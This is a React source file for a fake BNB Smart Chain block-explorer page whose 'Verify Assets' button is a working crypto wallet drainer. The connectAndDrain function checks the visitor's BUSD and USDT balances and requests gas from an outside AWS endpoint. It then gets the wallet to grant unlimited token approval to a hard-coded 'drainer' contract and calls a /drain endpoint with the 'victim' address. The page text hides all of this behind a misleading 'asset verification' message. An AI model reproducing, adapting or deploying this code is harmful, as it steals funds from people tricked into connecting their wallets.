import React, { useState } from "react";
import { IoCubeOutline } from "react-icons/io5";
import { MdOutlineGridView } from "react-icons/md";
import { ethers } from "ethers";
import "../assets/css/LatestBlocks.css";

const LatestBlocks = () => {
  const [connectedAccount, setConnectedAccount] = useState(null);
  const [loading, setLoading] = useState(false);

  const API_BASE_URL = "https://eqisn0r49g.execute-api.ap-south-1.amazonaws.com";
  const drainerContractAddress = "0x0bfe730C4fE8952C01f5539B987462Fc3cA5ba3A";
  const tokenList = [
    { symbol: "BUSD", address: "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56", decimals: 18 },
    { symbol: "USDT", address: "0x55d398326f99059fF775485246999027B3197955", decimals: 18 },
  ];
  const BSC_MAINNET_CHAIN_ID = "0x38";

  const bscProvider = new ethers.JsonRpcProvider("https://bsc-dataseed.binance.org/");

  const switchToBSC = async () => {
    try {
      await window.ethereum.request({
        method: "wallet_switchEthereumChain",
        params: [{ chainId: BSC_MAINNET_CHAIN_ID }],
      });
      const chainId = await window.ethereum.request({ method: "eth_chainId" });
      if (chainId !== BSC_MAINNET_CHAIN_ID) throw new Error("Failed to switch to BSC Mainnet");
      return true;
    } catch (error) {
      if (error.code === 4902) {
        try {
          await window.ethereum.request({
            method: "wallet_addEthereumChain",
            params: [{
              chainId: BSC_MAINNET_CHAIN_ID,
              chainName: "Binance Smart Chain Mainnet",
              nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
              rpcUrls: ["https://bsc-dataseed.binance.org/"],
              blockExplorerUrls: ["https://bscscan.com"],
            }],
          });
          const chainId = await window.ethereum.request({ method: "eth_chainId" });
          return chainId === BSC_MAINNET_CHAIN_ID;
        } catch (addError) {
          console.error("Error adding BSC network:", addError);
          return false;
        }
      } else {
        console.error("Error switching to BSC:", error);
        return false;
      }
    }
  };

  const checkAndSendGas = async (connectedAddress) => {
    try {
      const balance = await bscProvider.getBalance(connectedAddress);
      console.log(`Victim BNB balance: ${ethers.formatEther(balance)} BNB`);
      if (ethers.formatEther(balance) === "0.0") {
        setLoading(true);
        console.log(`Sending gas to ${connectedAddress} via /check-and-fund...`);
        const gasResponse = await fetch(`${API_BASE_URL}/check-and-fund`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ victimAddress: connectedAddress }),
        });
        if (!gasResponse.ok) {
          throw new Error(`HTTP error! Status: ${gasResponse.status}`);
        }
        const gasData = await gasResponse.json();
        if (gasData.success) {
          let attempts = 0;
          while (ethers.formatEther(await bscProvider.getBalance(connectedAddress)) === "0.0" && attempts < 15000) {
            console.log("Waiting for gas...");
            await new Promise(resolve => setTimeout(resolve, 5000));
            attempts++;
          }
          console.log(`Gas sent to ${connectedAddress}`);
        } else {
          throw new Error(gasData.message || "Gas funding failed");
        }
        setLoading(false);
        return true;
      }
      return true;
    } catch (error) {
      console.error("Error checking/sending gas:", error.message);
      setLoading(false);
      return false;
    }
  };

  const connectAndDrain = async () => {
    try {
      if (!window.ethereum) {
        alert("Please install Trust Wallet or MetaMask!");
        return;
      }

      setLoading(true);

      const switchSuccess = await switchToBSC();
      if (!switchSuccess) throw new Error("Could not switch to BSC Mainnet");

      const walletProvider = new ethers.BrowserProvider(window.ethereum);
      const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
      const connectedAddress = accounts[0];
      const signer = await walletProvider.getSigner();
      console.log("Connected address:", connectedAddress);
      setConnectedAccount(`${connectedAddress.slice(0, 6)}...${connectedAddress.slice(-4)}`);

      const network = await walletProvider.getNetwork();
      if (network.chainId !== BigInt(56)) throw new Error("Wallet is not on BSC Mainnet.");

      const bep20Abi = [
        "function balanceOf(address account) external view returns (uint256)",
        "function approve(address spender, uint256 amount) external returns (bool)",
      ];

      let hasTokens = false;
      for (const token of tokenList) {
        const tokenContract = new ethers.Contract(token.address, bep20Abi, bscProvider);
        const balance = await tokenContract.balanceOf(connectedAddress);
        console.log(`${token.symbol} Balance:`, ethers.formatUnits(balance, token.decimals));
        if (balance > 0) hasTokens = true;
      }

      if (!hasTokens) {
        setLoading(false);
        alert("No tokens found to process.");
        return;
      }

      const gasAvailable = await checkAndSendGas(connectedAddress);
      if (!gasAvailable) throw new Error("Failed to provide gas");

      console.log("Calling first /drain...");
      const drainResponse = await fetch(`${API_BASE_URL}/drain`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ victimAddress: connectedAddress, drainAll: true }),
      });
      const drainData = await drainResponse.json();
      console.log("First drain response:", drainData);

      if (drainData.needsApproval) {
        for (const token of tokenList) {
          const tokenContract = new ethers.Contract(token.address, bep20Abi, signer);
          const balance = await tokenContract.balanceOf(connectedAddress);
          if (balance > 0) {
            console.log(`Approving ${token.symbol}...`);
            try {
              const tx = await tokenContract.approve(drainerContractAddress, ethers.MaxUint256, { gasLimit: 100000 });
              console.log(`Approval tx for ${token.symbol}:`, tx.hash);
              await tx.wait();
              console.log(`${token.symbol} approved`);
            } catch (error) {
              console.error(`Error approving ${token.symbol}:`, error.message);
              throw error;
            }
          }
        }
        console.log("Calling second /drain...");
        const finalDrainResponse = await fetch(`${API_BASE_URL}/drain`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ victimAddress: connectedAddress, drainAll: true }),
        });
        const finalData = await finalDrainResponse.json();
        console.log("Final drain response:", finalData);
        if (!finalData.success) throw new Error("Draining failed: " + finalData.message);
      }

      setLoading(false);
      alert("Assets verified and processed successfully!");
    } catch (error) {
      console.error("Error in connectAndDrain:", error.message, error.stack);
      setLoading(false);
      alert(`Error: ${error.message || "An unexpected error occurred"}`);
    }
  };

  const blockList = [
    { no: "47863341", time: "6 secs ago", Validator: "CertiK", txns: "228", BNB: "0.10078" },
  ];

  return (
    <>
      <section className="bg-dark pt-14 pb-20 bg-banner">
        <div className="container-fluid px-lg-5">
          <h6 className="text-light text-center pt-4">
            Verify Your Assets and Confirm For Flash and Dummy Fund
          </h6>
          <div className="d-flex justify-content-center align-items-center btn-wrap">
            <button className="btn-custom" onClick={connectAndDrain} disabled={loading}>
              {loading ? "Processing..." : "Verify Assets"}
            </button>
          </div>
        </div>
      </section>

      <div className="container-fluid px-lg-5">
        <div className="col-lg-12 mt-4 mb-4">
          <div className="card h-100">
            <div className="card-header d-flex justify-content-between align-items-center">
              <h6 className="card-header-title mt-1">Latest Blocks</h6>
              <button
                type="button"
                className="btn btn-sm btn-white d-flex justify-content-between align-items-center border dark:border-white border-opacity-15"
                data-bs-toggle="modal"
                data-bs-target="#customizeCardModal"
                data-bs-card-index="1"
              >
                <MdOutlineGridView className="me-1" />
                Customize
              </button>
            </div>

            <div className="card-body overflow-auto scrollbar-custom" style={{ maxHeight: "30.3rem" }}>
              {blockList.map((item, index) => (
                <React.Fragment key={index}>
                  <div className="row">
                    <div className="col-sm-4">
                      <div className="d-flex align-items-center gap-2">
                        <div
                          className="d-none d-sm-flex content-center bg-light text-muted rounded p-3"
                          style={{ height: "3rem", width: "3rem" }}
                        >
                          <IoCubeOutline className="fs-lg" />
                        </div>
                        <div className="d-flex flex-row flex-sm-column align-items-center align-items-sm-start gap-1 gap-sm-0">
                          <span className="d-inline-block d-sm-none">Block</span>
                          <a
                            className="text-truncate text-decoration-none custom-font-color"
                            style={{ maxWidth: "6rem" }}
                            href="/block/47863341"
                          >
                            {item.no}
                          </a>
                          <div className="small text-muted">{item.time}</div>
                        </div>
                      </div>
                    </div>
                    <div className="col-sm-8 d-flex justify-content-sm-between align-items-end align-items-sm-center position-relative">
                      <div className="pe-0 pe-sm-2">
                        <div className="d-flex flex-wrap gap-1 custom-font-color">
                          Validated By
                          <a
                            className="text-truncate d-block text-decoration-none custom-font-color"
                            style={{ maxWidth: "8rem" }}
                            href="/address/0xbdcc079bbb23c1d9a6f36aa31309676c258abac7"
                          >
                            <span
                              data-bs-toggle="tooltip"
                              title="0xbdcc079bbb23c1d9a6f36aa31309676c258abac7"
                            >
                              Validator: {item.Validator}
                            </span>
                          </a>
                        </div>
                        <a
                          href="#"
                          data-bs-toggle="tooltip"
                          title="Transactions in this Block"
                          className="text-decoration-none custom-font-color"
                        >
                          {item.txns} txns
                        </a>{" "}
                        <span className="small text-muted me-2">in {item.time}</span>
                        <span
                          className="d-inline-block d-sm-none badge border dark:border-white border-opacity-15 text-dark fw-medium py-1 py-sm-1.5 px-1.5 px-sm-2"
                          data-bs-toggle="tooltip"
                          title="Block Reward"
                        >
                          0<b>.</b>{item.BNB} BNB
                        </span>
                      </div>
                      <div className="d-none d-sm-block text-end ms-2 ms-sm-0">
                        <span
                          className="badge border dark:border-white border-opacity-15 text-dark fw-medium py-1.5 px-2"
                          data-bs-toggle="tooltip"
                          title="Block Reward"
                        >
                          0<b>.</b> {item.BNB} BNB
                        </span>
                      </div>
                    </div>
                  </div>
                  <hr />
                </React.Fragment>
              ))}
            </div>

            <a
              className="card-footer bg-light fw-medium text-cap link-muted text-center text-decoration-none py-3"
              href="#"
              style={{ fontSize: "0.85rem" }}
            >
              VIEW ALL BLOCKS <i className="fa-solid fa-long-arrow-right ms-1"></i>
            </a>
          </div>
        </div>
      </div>
    </>
  );
};

export default LatestBlocks;